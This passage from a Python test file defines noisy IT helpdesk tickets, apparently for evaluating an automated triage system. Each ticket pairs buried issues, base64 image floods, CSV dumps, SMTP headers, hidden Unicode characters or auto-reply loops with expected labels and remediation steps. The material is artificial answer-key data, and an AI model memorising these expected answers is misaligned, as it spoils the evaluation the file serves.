                "- SOC 2 Type II audit fieldwork begins April 7. All evidence must be staged by April 1.\n"
                "- Phishing simulation click rate dropped from 12% to 8.5% — goal is 5% by year-end.\n"
                "- Privileged Access Workstation (PAW) rollout to Tier 0 admins complete.\n"
                "- Action: Security ops to deliver PAW Tier 1 rollout plan by March 28.\n\n"
                "AGENDA ITEM 5: Service Desk Metrics\n"
                "- Mean time to resolve (MTTR): 4.2 hours (target 4.0) — slight regression from Feb.\n"
                "- First-contact resolution rate: 68% (target 70%).\n"
                "- Top ticket categories: Password resets (24%), VPN issues (18%), Outlook (14%).\n"
                "- Action: Evaluate chatbot deflection for password reset tickets.\n\n"
                "AGENDA ITEM 6: Disaster Recovery Testing\n"
                "- Full DR failover test for Azure-hosted trading platform scheduled for April 19-20.\n"
                "- RPO target: 15 minutes. RTO target: 2 hours. Last test achieved RPO 12m, RTO 1h 48m.\n"
                "- Cross-region replication lag for Cosmos DB reduced from 320ms to 95ms.\n"
                "- Action: DR team to coordinate with Trading and Compliance for the test window.\n\n"
                "AGENDA ITEM 7: Data Center Decommissioning\n"
                "- Secaucus DC lease expires September 2026. 14 remaining racks to be migrated.\n"
                "- Physical server inventory audit complete — 6 servers unaccounted for, investigating.\n"
                "- Tape backup archive migration to Azure Blob Archive tier: 340TB of 480TB complete.\n"
                "- Action: Facilities to confirm decommissioning timeline with vendor by April 4.\n\n"
                "--- END OF AGENDA ITEMS ---\n\n"
                "** MY ACTUAL ISSUE (sorry for the long email) **\n\n"
                "On page 2 of the notes it mentions TB16 dock compatibility issues. I'm one of the\n"
                "affected users — my Dell Latitude 5550 with the TB16 dock loses USB-C video output\n"
                "intermittently. Both my external Dell U2722D monitors go black for 5-10 seconds\n"
                "every 20-30 minutes. I'm on the 8th floor, Building 4. The old WD19S dock I had\n"
                "before worked perfectly but it was collected during the refresh.\n\n"
                "Can I get a replacement WD19S dock or a fix for the TB16 compatibility?\n\n"
                "Thanks,\n"
                "Jonathan Park\n"
                "Portfolio Management, Building 4, 8th floor, New York"
            ),
            category=Category.HARDWARE,
            priority=Priority.P3,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO],
            next_best_action=(
                "Replace Dell TB16 dock with WD19S for user on Building 4, 8th floor — "
                "known USB-C video dropout issue with Latitude 5550 and TB16 docks."
            ),
            remediation_steps=[
                "Confirm the user's laptop model and current dock firmware version.",
                "Check if a TB16 firmware update resolves the intermittent video dropout.",
                "If the firmware update does not resolve, issue a WD19S replacement dock.",
                "Verify both external monitors work reliably on the replacement dock.",
                "Log the TB16 compatibility issue in the endpoint refresh tracker for reporting.",
            ],
            reporter_name="Jonathan Park",
            reporter_email="jonathan.park@contoso.com",
            reporter_department="Portfolio Management",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "very-long-email", "buried-issue"],
            difficulty="hard",
        ),
        # ── DC-014  Multiple base64 image floods ─────────────────────────
        ScenarioDefinition(
            scenario_id="DC-014",
            subject="Badge reader error — photos attached",
            description=(
                "My badge is not working at the Building 6 south entrance turnstile.\n\n"
                "I took several photos of the error on the badge reader screen. Here they are:\n\n"
                "Photo 1 - Front of badge reader:\n"
                "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAgGBgcGBQgHBwcJCQgK"
                "DBQNDBALDBKSEF4THBYdHRweGxwdICQuJyAiLCMcHCg3KSwwMTQ0NB8nOT04MjwuMzQy/2wBDAQkJ"
                "CQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIy"
                "MjIyMjL/wAARCABAAEADASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAABAgMEBQYHCAkKC//E"
                "AFAQAAIBAwMCBAMFBQQEAAABfQECAwAEEQUSITFBBhNRYQcicRQygZGhCCNCscEVUtHwJDNicoIJChYX"
                "GBkaJicoKSo1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoKDhIWGh4iJipKTlJ"
                "WWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6ery8/T19vf4"
                "+fr/xAAfAQADAQEBAQEBAQEBAAAAAAAAAQIDBAUGBwgJCgv/xABREAACAQIEBAMEBgUDBgMAAAABAgMAE"
                "QQSITFBBRNRYQYicZGBBzKhsRRCUsHB8BYj0fEUFTNickOSstIkZKLC4vDzGBcaNTY3JDREVSRFVWND"
                "/9oADAMBAAIRAxEAAAAB0AAAAFaGBogKoAAAAA0MFNNNAFiAAAAAAAAJIAAAAAAIIIAAAAAAAAAAAAAAAAA"
                "AAAAAA//2Q==\n\n"
                "Photo 2 - Error message closeup:\n"
                "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDABsSFBcUERsXFhceHBsgKEIr"
                "KCUlKFE6PTBCYFVlZF9VXFtqeJmBanGQc1tdhbWGkJ6jq62rZ4C8ybqmx5moq6T/2wBDARceHigs"
                "KE4rKU5qd1p3ampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqamr/wAAR"
                "CAAgACADASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAHwEAAwEBAQEB"
                "AQEBAQAAAAAAAAECAwQFBgcICQoL/8QAFRABAAAAAAAAAAAAAAAAAAAAcP/EABQRAQAAAAAAAAAAAAAAA"
                "AAAYP/aAAwDAQACEQMRAD8AlgVVHcjIGcZHPSn1BDKkybkZWHqDmn0AFFFFAB/9k=\n\n"
                "Photo 3 - My badge (front side):\n"
                "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHLAAAACXBIWXMAAA"
                "sTAAALEwEAmpwYAAACcElEQVR4nO3dO27CQBSG4TPiCehpoKGjpMwWKNgSJTtgB2yBgjJboKOkpKGh"
                "4wnIK7gIhGDGc+Z/PkmWkC3N+BvN2BrnAAAAAAAAAAAAAAAAAMDUVWM/gTYq5+9x3/6Y4kQwGpkARA"
                "kARAIAkQBAJAAQCQBEAgCRAEAkABAJAEQCAJEAQCQAEAkARAIA0X9Bep+0vJOUlpJykWQn6UPSLMq8"
                "AAAAAAAAAAAAAAAAAAAAAAAAAAA//2Q==\n\n"
                "Photo 4 - Badge reader model number plate:\n"
                "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAFUlEQVQYV2"
                "P8z8BQz0AEYBxVOHIVAvcHBQHzKSECAAAAAElFTkSuQmCC"
                "iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAFklEQVQYV2P4z8BQz0AEYBxVSHEVAvMH"
                "BQPxKSMCAAAAAElFTkSuQmCC\n\n"
                "Photo 5 - Side angle of turnstile:\n"
                "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQN"
                "DAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDB"
                "gNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj"
                "L/wAARCAABAAEDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAFBABAA"
                "AAAAAAAAAAAAAAAAAA/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEQMRAD8ALQAB//Z=\n\n"
                "The error message on the screen said 'Card Read Error - Contact Facilities' in red.\n"
                "I tried tapping multiple times. My badge works fine at the north entrance.\n\n"
                "Yuki Tanaka\n"
                "Quantitative Analysis, Building 6, 3rd floor"
            ),
            category=Category.HARDWARE,
            priority=Priority.P3,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO],
            next_best_action=(
                "Investigate badge reader 'Card Read Error' at Building 6 south entrance "
                "turnstile — badge works at north entrance, suggesting a reader hardware fault."
            ),
            remediation_steps=[
                "Dispatch a facilities technician to inspect the Building 6 south entrance badge reader.",
                "Check the badge reader logs for error patterns and failed card reads.",
                "Test the reader with a known-good badge to confirm it is a reader-side issue.",
                "Replace or recalibrate the reader if it is confirmed faulty.",
                "Verify the user's badge works at the south entrance after the fix.",
            ],
            reporter_name="Yuki Tanaka",
            reporter_email="yuki.tanaka@contoso.com",
            reporter_department="Quantitative Analysis",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "base64-flood", "image-heavy"],
            difficulty="hard",
        ),
        # ── DC-015  Inline CSV / tabular data dump ────────────────────────
        ScenarioDefinition(
            scenario_id="DC-015",
            subject="Server performance degradation — metrics attached inline",
            description=(
                "Hi team,\n\n"
                "The sqlprod-nyc-04 server is running very slow. Here are the performance metrics\n"
                "I exported from our monitoring tool:\n\n"
                "timestamp,cpu_pct,mem_pct,disk_io_mbps,net_in_mbps,net_out_mbps,active_connections,query_queue\n"
                "2026-03-17T08:00:00Z,42.3,61.2,120.5,45.2,32.1,342,12\n"
                "2026-03-17T08:05:00Z,44.1,62.0,125.3,47.8,33.4,351,14\n"
                "2026-03-17T08:10:00Z,48.7,63.5,131.2,49.1,35.2,367,18\n"
                "2026-03-17T08:15:00Z,55.2,65.8,142.7,52.3,38.6,389,24\n"
                "2026-03-17T08:20:00Z,62.8,68.4,158.3,56.7,41.2,412,32\n"
                "2026-03-17T08:25:00Z,71.3,72.1,175.6,61.4,44.8,438,45\n"
                "2026-03-17T08:30:00Z,78.9,76.3,192.4,67.2,48.3,461,58\n"
                "2026-03-17T08:35:00Z,84.2,79.8,210.1,72.8,52.1,487,72\n"
                "2026-03-17T08:40:00Z,89.1,83.4,228.7,78.3,56.7,512,89\n"
                "2026-03-17T08:45:00Z,93.7,87.2,245.3,83.9,61.2,538,105\n"
                "2026-03-17T08:50:00Z,96.2,90.1,261.8,89.4,65.8,561,128\n"
                "2026-03-17T08:55:00Z,98.1,92.8,278.4,94.7,70.3,589,156\n"
                "2026-03-17T09:00:00Z,99.3,95.4,295.1,100.2,74.9,612,189\n"
                "2026-03-17T09:05:00Z,99.7,96.8,310.6,105.8,79.4,641,224\n"
                "2026-03-17T09:10:00Z,99.8,97.5,326.2,111.3,83.8,668,261\n"
                "2026-03-17T09:15:00Z,99.9,98.1,341.7,116.9,88.3,694,298\n"
                "2026-03-17T09:20:00Z,99.9,98.6,357.3,122.4,92.7,721,336\n"
                "2026-03-17T09:25:00Z,99.9,99.0,372.8,128.0,97.2,748,374\n"
                "2026-03-17T09:30:00Z,100.0,99.2,388.4,133.5,101.6,776,412\n\n"
                "As you can see CPU goes from 42% to 100% in 90 minutes. The query queue is\n"
                "backing up and users are complaining about slow report generation.\n\n"
                "Leon Fischer\n"
                "Data Engineering, NYC"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P2,
            team=Team.DATA_PLATFORM,
            needs_escalation=True,
            missing_info=[MissingInfo.AFFECTED_USERS, MissingInfo.BUSINESS_IMPACT],
            next_best_action=(
                "Investigate sqlprod-nyc-04 resource exhaustion — CPU at 100%, memory at 99%, "
                "and query queue growing to 400+ since 08:00. Likely a runaway query or batch job."
            ),
            remediation_steps=[
                "Identify the top resource-consuming queries on sqlprod-nyc-04 using sys.dm_exec_requests.",
                "Check if a scheduled batch job or report is causing the CPU and memory spike.",
                "Kill or throttle the runaway query if identified, and notify the owning team.",
                "Monitor the server for recovery and verify the query queue is draining.",
                "Review Resource Governor settings to prevent a single workload from saturating the server.",
            ],
            reporter_name="Leon Fischer",
            reporter_email="leon.fischer@contoso.com",
            reporter_department="Data Engineering",
            channel=Channel.CHAT,
            tags=["data-cleanup", "csv-dump", "tabular-data"],
            difficulty="hard",
        ),
        # ── DC-016  URL spam / hyperlink overload ─────────────────────────
        ScenarioDefinition(
            scenario_id="DC-016",
            subject="Broken links on the intranet compliance pages",
            description=(
                "Hi,\n\n"
                "Multiple links on our compliance intranet site are broken. Here are all the ones\n"
                "I've checked (some work, most don't):\n\n"
                "BROKEN:\n"
                "- https://intranet.contoso.com/compliance/policies/aml-kyc-policy-v3.2.pdf\n"
                "- https://intranet.contoso.com/compliance/policies/insider-trading-guidelines.pdf\n"
                "- https://intranet.contoso.com/compliance/training/annual-certification-2026.aspx\n"
                "- https://intranet.contoso.com/compliance/forms/conflict-of-interest-disclosure.docx\n"
                "- https://intranet.contoso.com/compliance/policies/data-retention-schedule-v2.1.xlsx\n"
                "- https://intranet.contoso.com/compliance/external/sec-rule-17a-4-reference.pdf\n"
                "- https://intranet.contoso.com/compliance/external/finra-rule-4511-guidance.pdf\n"
                "- https://intranet.contoso.com/compliance/procedures/sar-filing-checklist.pdf\n"
                "- https://intranet.contoso.com/compliance/procedures/whistleblower-procedure.pdf\n"
                "- https://intranet.contoso.com/compliance/training/code-of-conduct-quiz.aspx\n"
                "- https://intranet.contoso.com/compliance/reports/q4-2025-compliance-dashboard.pbix\n"
                "- https://intranet.contoso.com/compliance/reports/regulatory-exam-tracker.xlsx\n\n"
                "WORKING:\n"
                "- https://intranet.contoso.com/compliance/index.aspx\n"
                "- https://intranet.contoso.com/compliance/team/contact-us.aspx\n"
                "- https://intranet.contoso.com/compliance/news/latest-updates.aspx\n\n"
                "We have a regulatory exam next week and auditors need access to these documents.\n"
                "This is urgent.\n\n"
                "Maya Johal\n"
                "Regulatory Affairs, Building 1, 9th floor"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=True,
            missing_info=[MissingInfo.TIMESTAMP],
            next_best_action=(
                "Investigate broken links on the compliance intranet site — 12 of 15 links "
                "returning errors, likely caused by a content migration or site restructure. "
                "Urgent due to upcoming regulatory exam."
            ),
            remediation_steps=[
                "Check the SharePoint or IIS logs for the compliance site to identify the error pattern.",
                "Verify if a recent content migration or URL restructure moved or renamed the documents.",
                "Restore or redirect the broken document links to their new locations.",
                "Test all 12 broken links after the fix to confirm they resolve correctly.",
                "Notify the Regulatory Affairs team once all links are restored.",
            ],
            reporter_name="Maya Johal",
            reporter_email="maya.johal@contoso.com",
            reporter_department="Regulatory Affairs",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "url-spam", "hyperlink-overload"],
            difficulty="hard",
        ),
        # ── DC-017  Raw SMTP headers dump ─────────────────────────────────
        ScenarioDefinition(
            scenario_id="DC-017",
            subject="Emails from external clients being delayed — headers included",
            description=(
                "Hi IT team,\n\n"
                "I'm getting emails from external clients with delays of 2-4 hours. I grabbed the\n"
                "full message headers from one of the delayed emails — here they are:\n\n"
                "Return-Path: <john.smith@acmecapital.com>\n"
                "Received: from EX01.contoso.com (10.1.4.21) by EX03.contoso.com (10.1.4.23)\n"
                " with Microsoft SMTP Server (version=TLS1_2,\n"
                " cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.2.1118.40;\n"
                " Tue, 17 Mar 2026 14:22:31 -0500\n"
                "Received: from edge01.contoso.com (10.1.2.10) by EX01.contoso.com (10.1.4.21)\n"
                " with Microsoft SMTP Server (version=TLS1_2,\n"
                " cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.2.1118.40;\n"
                " Tue, 17 Mar 2026 14:22:28 -0500\n"
                "Received: from mail-yw1-f169.google.com (209.85.128.169) by edge01.contoso.com\n"
                " (10.1.2.10) with Microsoft SMTP Server (version=TLS1_2,\n"
                " cipher=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256) id 15.2.1118.40\n"
                " via Frontend Transport; Tue, 17 Mar 2026 12:15:44 -0500\n"
                "Received: by mail-yw1-f169.google.com with SMTP id\n"
                " 00721157ae682-6f2b3c2e9d4so12345678b3.1\n"
                " for <nadia.okafor@contoso.com>; Tue, 17 Mar 2026 09:15:42 -0800 (PST)\n"
                "DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=acmecapital.com;\n"
                " s=google; h=from:to:subject:date:message-id:mime-version;\n"
                " bh=abc123def456ghi789jkl012mno345pqr678stu901vwx=;\n"
                " b=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmn\n"
                "Authentication-Results: edge01.contoso.com;\n"
                " dkim=pass (signature was verified) header.d=acmecapital.com;\n"
                " spf=pass (sender IP is 209.85.128.169) smtp.mailfrom=acmecapital.com;\n"
                " dmarc=pass action=none header.from=acmecapital.com;\n"
                "X-MS-Exchange-Organization-SCL: 1\n"
                "X-MS-Exchange-Organization-AuthSource: edge01.contoso.com\n"
                "X-MS-Exchange-Organization-AuthAs: Anonymous\n"
                "X-MS-Exchange-Transport-CrossTenantHeadersStamped: EX03.contoso.com\n"
                "X-Forefront-Antispam-Report: CIP:209.85.128.169;CTRY:US;LANG:en;\n"
                " SFV:NSPM;SFS:;DIR:INB;SFP:;SCL:1;SRVR:EX03;\n"
                "Message-ID: <CABx+XYZ123@mail.gmail.com>\n"
                "Date: Tue, 17 Mar 2026 09:15:40 -0800\n"
                "From: John Smith <john.smith@acmecapital.com>\n"
                "To: Nadia Okafor <nadia.okafor@contoso.com>\n"
                "Subject: Q1 Portfolio Rebalancing - Urgent Review\n"
                "MIME-Version: 1.0\n"
                'Content-Type: multipart/alternative; boundary="0000000000abc123def456"\n\n'
                "As you can see, there's a 2+ hour gap between when it hits edge01 at 12:15\n"
                "and when it reaches EX01 at 14:22. This is happening on most external emails.\n"
                "Internal emails are fine.\n\n"
                "Nadia Okafor\n"
                "Client Services, Building 1, 4th floor, New York"
            ),
            category=Category.NETWORK,
            priority=Priority.P2,
            team=Team.NETWORK_OPS,
            needs_escalation=True,
            missing_info=[MissingInfo.AFFECTED_USERS],
            next_best_action=(
                "Investigate 2-hour mail delivery delay between edge01 and EX01 for inbound "
                "external email — likely a mail queue bottleneck or transport rule processing delay."
            ),
            remediation_steps=[
                "Check the mail queue on edge01.contoso.com for message backlog or throttling.",
                "Review Exchange transport rule processing times for inbound external messages.",
                "Check Forefront/EOP content filtering for latency spikes on edge01.",
                "Verify network connectivity and DNS resolution between edge01 and EX01.",
                "If a queue backlog is confirmed, increase transport capacity or clear stuck messages.",
            ],
            reporter_name="Nadia Okafor",
            reporter_email="nadia.okafor@contoso.com",
            reporter_department="Client Services",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "smtp-headers", "raw-headers"],
            difficulty="hard",
        ),
        # ── DC-018  Unicode/RTL text & zero-width characters ──────────────
        ScenarioDefinition(
            scenario_id="DC-018",
            subject="Can\u2019t upload files to SharePoint \u200e\u200f\u200b\u2069— help needed",
            description=(
                "Hi,\n\n"
                "I\u2019m having trouble uploading files to our team\u2019s SharePoint site.\u200b\u200b\u200b\n\n"
                "When I try to upload, I get this error:\u200e\n"
                "\u200f\u202b\u0627\u0644\u062e\u0637\u0623: "
                "\u0641\u0634\u0644 \u0627\u0644\u062a\u062d\u0645\u064a\u0644\u202c\u200e "
                '"Upload failed: The file name contains invalid characters"\u200b\u200b\n\n'
                "The file I\u2019m trying to upload is:\u200e\n"
                "\u200fQ1\u200b_2026_\u200e\u200fPortfolio\u200b_\u200eAnalysis\u200f_FINAL\u200b\u200b\u200b.xlsx\u200e\n\n"
                "I renamed it from the original which was:\u200e\n"
                "\u200f\u202b\u062a\u062d\u0644\u064a\u0644_\u0627\u0644\u0645\u062d\u0641\u0638\u0629_\u0627\u0644\u0631\u0628\u0639_\u0627\u0644\u0623\u0648\u0644\u202c\u200e_2026.xlsx\n\n"
                "Even the renamed version won\u2019t upload.\u200b My colleague Amir can upload\n"
                "files fine from his machine.\u200b\u200b\u200b I\u2019m using Edge on Windows 11.\u200b\n\n"
                "The SharePoint site URL is:\u200e\n"
                "https://contoso.sharepoint.com/sites/\u200fWealthMgmt\u200e/Shared%20Documents\u200b\n\n"
                "Please help, I have a client presentation tomorrow and need\n"
                "to share these files with the team.\u200b\u200b\u200b\n\n"
                "Layla Mansouri\u200e\u200f\n"
                "Wealth Management, Building 2, 5th floor, London\u200b"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.APPLICATION_VERSION],
            next_best_action=(
                "Investigate SharePoint upload failure caused by invisible Unicode characters "
                "(zero-width spaces, RTL/LTR marks) in the file name — user needs to strip "
                "hidden characters from the filename."
            ),
            remediation_steps=[
                "Identify the zero-width and bidirectional Unicode characters in the file name.",
                "Rename the file using only ASCII characters and re-attempt the upload.",
                "Check if the original Arabic filename triggered SharePoint's invalid character filter.",
                "Verify the SharePoint site does not have a custom file naming policy blocking the upload.",
                "Confirm the upload succeeds after the file is renamed with clean characters.",
            ],
            reporter_name="Layla Mansouri",
            reporter_email="layla.mansouri@contoso.com",
            reporter_department="Wealth Management",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "unicode-rtl", "zero-width-chars"],
            difficulty="hard",
        ),
        # ── DC-019  JSON / XML configuration dump inline ──────────────────
        ScenarioDefinition(
            scenario_id="DC-019",
            subject="Application gateway returning 502 — config dump attached",
            description=(
                "Hi,\n\n"
                "Our Azure Application Gateway (appgw-prod-eus2-01) is returning 502 Bad Gateway\n"
                "errors intermittently. I exported the current backend pool configuration:\n\n"
                "```json\n"
                "{\n"
                '  "backendAddressPools": [\n'
                "    {\n"
                '      "name": "pool-api-prod",\n'
                '      "properties": {\n'
                '        "backendAddresses": [\n'
                '          { "ipAddress": "10.42.1.10" },\n'
                '          { "ipAddress": "10.42.1.11" },\n'
                '          { "ipAddress": "10.42.1.12" },\n'
                '          { "ipAddress": "10.42.1.13" }\n'
                "        ],\n"
                '        "provisioningState": "Succeeded"\n'
                "      }\n"
                "    },\n"
                "    {\n"
                '      "name": "pool-web-prod",\n'
                '      "properties": {\n'
                '        "backendAddresses": [\n'
                '          { "ipAddress": "10.42.2.10" },\n'
                '          { "ipAddress": "10.42.2.11" },\n'
                '          { "ipAddress": "10.42.2.12" }\n'
                "        ],\n"
                '        "provisioningState": "Succeeded"\n'
                "      }\n"
                "    }\n"
                "  ],\n"
                '  "backendHttpSettingsCollection": [\n'
                "    {\n"
                '      "name": "http-settings-api",\n'
                '      "properties": {\n'
                '        "port": 8443,\n'
                '        "protocol": "Https",\n'
                '        "requestTimeout": 30,\n'
                '        "probe": { "id": "/subscriptions/.../probes/probe-api-health" },\n'
                '        "hostName": "api-internal.contoso.com",\n'
                '        "pickHostNameFromBackendAddress": false\n'
                "      }\n"
                "    },\n"
                "    {\n"
                '      "name": "http-settings-web",\n'
                '      "properties": {\n'
                '        "port": 443,\n'
                '        "protocol": "Https",\n'
                '        "requestTimeout": 60,\n'
                '        "probe": { "id": "/subscriptions/.../probes/probe-web-health" },\n'
                '        "hostName": "www-internal.contoso.com",\n'
                '        "pickHostNameFromBackendAddress": false\n'
                "      }\n"
                "    }\n"
                "  ],\n"
                '  "probes": [\n'
                "    {\n"
                '      "name": "probe-api-health",\n'
                '      "properties": {\n'
                '        "protocol": "Https",\n'
                '        "host": "api-internal.contoso.com",\n'
                '        "path": "/health",\n'
                '        "interval": 30,\n'
                '        "timeout": 10,\n'
                '        "unhealthyThreshold": 3\n'
                "      }\n"
                "    },\n"
                "    {\n"
                '      "name": "probe-web-health",\n'
                '      "properties": {\n'
                '        "protocol": "Https",\n'
                '        "host": "www-internal.contoso.com",\n'
                '        "path": "/healthz",\n'
                '        "interval": 30,\n'
                '        "timeout": 10,\n'
                '        "unhealthyThreshold": 3\n'
                "      }\n"
                "    }\n"
                "  ]\n"
                "}\n"
                "```\n\n"
                "The 502 errors happen mostly between 09:00-09:30 when traffic spikes. The health\n"
                "probes seem to be passing fine in Azure Portal. Could be a backend timeout issue\n"
                "since the API pool timeout is only 30 seconds.\n\n"
                "Henrik Svensson\n"
                "Cloud Infrastructure, New York"
            ),
            category=Category.NETWORK,
            priority=Priority.P2,
            team=Team.NETWORK_OPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "Investigate intermittent 502 errors on appgw-prod-eus2-01 during morning "
                "traffic peak — backend pool timeout of 30s may be too low for the API tier "
                "under load."
            ),
            remediation_steps=[
                "Check Application Gateway access logs for 502 errors and correlate with backend health probe results.",
                "Review backend pool member (10.42.1.10-13) health status during the 09:00-09:30 window.",
                "Increase the API backend HTTP settings request timeout from 30s to 60s.",
                "Check if the backend VMs are hitting CPU or memory limits during the traffic spike.",
                "Consider enabling connection draining and auto-scaling on the Application Gateway.",
            ],
            reporter_name="Henrik Svensson",
            reporter_email="henrik.svensson@contoso.com",
            reporter_department="Cloud Infrastructure",
            channel=Channel.CHAT,
            tags=["data-cleanup", "json-config-dump", "inline-code"],
            difficulty="hard",
        ),
        # ── DC-020  Auto-reply / out-of-office loop concatenation ─────────
        ScenarioDefinition(
            scenario_id="DC-020",
            subject="Re: Re: Re: Automatic reply: Re: Automatic reply: VPN token expired",
            description=(
                "--- Automatic Reply ---\n"
                "Thank you for your email. I am currently out of the office from March 14\n"
                "through March 21 with limited access to email. For urgent IT matters, please\n"
                "contact the IT Service Desk at x5000 or itsupport@contoso.com.\n\n"
                "Best regards,\nAmy Chen\nIT Service Desk Analyst\n\n"
                "--- Automatic Reply ---\n"
                "Hi, this is Carlos Mendez. I'm out of the office until March 19.\n"
                "For immediate assistance please reach out to my backup, Jenny Park\n"
                "(jenny.park@contoso.com).\n\n"
                "--- Automatic Reply ---\n"
                "Thank you for your email. I am currently out of the office from March 14\n"
                "through March 21 with limited access to email. For urgent IT matters, please\n"
                "contact the IT Service Desk at x5000 or itsupport@contoso.com.\n\n"
                "Best regards,\nAmy Chen\nIT Service Desk Analyst\n\n"
                "--- Automatic Reply ---\n"
                "Hi, this is Carlos Mendez. I'm out of the office until March 19.\n"
                "For immediate assistance please reach out to my backup, Jenny Park\n"
                "(jenny.park@contoso.com).\n\n"
                "--- Original Message ---\n"
                "From: Carlos Mendez <carlos.mendez@contoso.com>\n"
                "Sent: Thursday, March 14, 2026 2:05 PM\n"
                "To: IT Support <itsupport@contoso.com>\n"
                "Subject: VPN token expired\n\n"
                "Hi team,\n\n"
                "My RSA SecurID soft token expired and I can't generate new VPN codes. The\n"
                "token shows 'Token Disabled' in the app. I need VPN access to work from\n"
                "home next week while the office is closed for maintenance.\n\n"
                "My employee ID is E-28491. Can you please re-provision my token?\n\n"
                "Thanks,\n"
                "Carlos Mendez\n"
                "Derivatives, Building 3, 6th floor, New York"
            ),
            category=Category.ACCESS_AUTH,
            priority=Priority.P2,
            team=Team.IAM,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO],
            next_best_action=(
                "Re-provision expired RSA SecurID soft token for employee E-28491 — "
                "token shows 'Disabled' and user needs VPN access for remote work next week."
            ),
            remediation_steps=[
                "Look up employee E-28491 in the RSA Authentication Manager console.",
                "Verify the token status and confirm it is disabled/expired.",
                "Re-provision a new RSA SecurID soft token and send the activation link to the user.",
                "Guide the user through importing the new token on their mobile device.",
                "Test VPN connectivity with the new token before the office closure.",
            ],
            reporter_name="Carlos Mendez",
            reporter_email="carlos.mendez@contoso.com",
            reporter_department="Derivatives",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "auto-reply-loop", "ooo-concatenation"],
            difficulty="hard",
        ),
        # ── DC-021  Enormous forward chain with 10+ participants ─────────────
        ScenarioDefinition(
            scenario_id="DC-021",
            subject=("FW: FW: FW: FW: FW: FW: FW: FW: FW: FW: Re: SAP access for new joiner"),
            description=(
                "--- Latest reply ---\n"
                "Hi IT, can someone PLEASE just grant the SAP access already? This has "
                "been bouncing around for two weeks.\n"
                "— Anita\n\n"
                "--- Forwarded by: Raj Kapoor (raj.kapoor@contoso.com) ---\n"
                "Anita, I don't handle SAP provisioning anymore. Forwarding to IT.\n\n"
                "--- Forwarded by: Chen Wei (chen.wei@contoso.com) ---\n"
                "Raj, can you take this? I think SAP is under your team now.\n\n"
                "--- Forwarded by: Lisa Johansson (lisa.johansson@contoso.com) ---\n"
                "Chen, this came to me by mistake. Please route to the right team.\n\n"
                "--- Forwarded by: Mike Torres (mike.torres@contoso.com) ---\n"
                "Lisa, not sure who handles this. Adding you since you did it last time.\n\n"
                "--- Forwarded by: Priya Sharma (priya.sharma@contoso.com) ---\n"
                "Mike, I'm on parental leave. Please find someone else.\n\n"
                "--- Forwarded by: David Kim (david.kim@contoso.com) ---\n"
                "Priya, you did SAP access last quarter — can you handle this?\n\n"
                "--- Forwarded by: Fatima Al-Rashid (fatima.al-rashid@contoso.com) ---\n"
                "David, this should go to the SAP team. I only handle Salesforce.\n\n"
                "--- Forwarded by: Tom O'Brien (tom.obrien@contoso.com) ---\n"
                "Fatima, can your team handle this? I think it's an enterprise app thing.\n\n"
                "--- Forwarded by: Sandra Nguyen (sandra.nguyen@contoso.com) ---\n"
                "Tom, forwarding to you since you're the app team lead.\n\n"
                "--- Original Message ---\n"
                "From: Anita Desai <anita.desai@contoso.com>\n"
                "Sent: Monday, March 3, 2026 9:00 AM\n"
                "To: IT Support <itsupport@contoso.com>\n"
                "Subject: SAP access for new joiner\n\n"
                "Hi team,\n\n"
                "I just joined the Finance department last week and need SAP access "
                "(modules: FI, CO, and MM) to start processing invoices. My employee "
                "ID is E-31024 and my manager is Robert Chen (Director, Finance).\n\n"
                "Thanks,\nAnita Desai\nFinance, Building 1, 3rd floor, New York"
            ),
            category=Category.ACCESS_AUTH,
            priority=Priority.P3,
            team=Team.IAM,
            needs_escalation=False,
            missing_info=[MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "Provision SAP access (FI, CO, MM modules) for new joiner E-31024 in "
